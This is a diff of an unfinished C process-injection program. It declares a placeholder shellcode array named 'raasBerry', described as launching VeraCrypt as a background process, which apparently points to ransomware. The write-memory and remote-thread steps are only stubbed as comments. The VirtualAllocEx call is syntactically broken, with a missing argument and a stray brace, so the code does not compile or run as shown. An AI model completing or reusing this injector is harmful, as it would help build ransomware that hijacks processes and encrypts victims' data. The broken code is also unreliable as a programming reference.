@@ -5,10 +5,15 @@
 DWORD PID = NULL; 
 HANDLE hProcess = NULL;
 HANDLE hThread = NULL;
+LPVOID rBuffer = NULL;
 
+// shellcode
+unsigned char raasBerry[] = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x90"; // shellcode for executing veracrypt software as background process
+// awaiting almydr's part.
 
 int main(int argc, char* argv[]) {
-    // Get a handle on a process by attaching to, or creating one
+// Get a handle on a process by attaching to, or creating one
+    
     if (argc < 2) {
 
 
@@ -30,11 +35,16 @@ int main(int argc, char* argv[]) {
         //GetLastError();
         return EXIT_FAILURE;
     };
-    // Allocate a buffer in the process memory with the necessary permissions
 
-    //Write the contents of the shellcode to that buffer in the process memory
+// Allocate a buffer in the process memory with the necessary permissions
 
-    //Create a thread that will run in allocated memory and written into the process
+    VirtualAllocEx(hProcess, NULL, ){ //Extended version
+
+    return EXIT_SUCCESS;
+    }
+// Write the contents of the shellcode to that buffer in the process memory
+
+// Create a thread that will run in allocated memory and written into the process
     
     return EXIT_SUCCESS;
 
